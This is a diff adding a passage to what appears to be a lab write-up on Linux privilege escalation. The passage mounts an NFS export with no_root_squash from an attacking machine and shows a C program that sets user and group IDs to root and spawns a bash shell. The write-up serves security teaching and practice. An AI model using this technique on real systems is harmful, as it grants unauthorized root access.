@@ -677,3 +677,24 @@ Export list for 10.10.102.151:
 /tmp                      *
 /home/backup              *
 ```
+
+We will mount one of the “no_root_squash” shares to our attacking machine and start building our executable.
+
+```
+┌─[lnxuser@lnxhost]─[/tmp/attack]
+└──╼ $sudo mount -o rw 10.10.102.151:/home/backup .
+```
+
+```
+┌─[lnxuser@lnxhost]─[/tmp/attack]
+└──╼ $cat exploit.c 
+int main() {
+
+	setgid(0);
+	setuid(0);
+	system("/bin/bash");
+	return 0;
+
+}
+```
+
